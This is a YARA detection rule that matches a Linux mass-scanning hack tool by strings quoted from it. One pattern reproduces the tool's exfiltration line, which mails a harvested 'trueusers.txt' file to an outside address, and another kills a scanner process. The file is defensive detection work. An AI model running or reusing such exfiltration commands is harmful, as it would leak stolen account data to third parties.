import "pe"

rule SIGNATURE_BASE_Linuxhacktool_Eyes_Mass
{
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth (Nextron Systems)"
		id = "5da0c474-2dc8-5580-bf5c-d3f464225e4c"
		date = "2015-01-19"
		modified = "2023-12-05"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/yara/thor-hacktools.yar#L2889-L2906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/LICENSE"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
		logic_hash = "5bf17d1a8ae78681d2c3cba8511019ddf85e6d7a242900b56848521eef40ffc6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii

	condition:
		1 of them
}
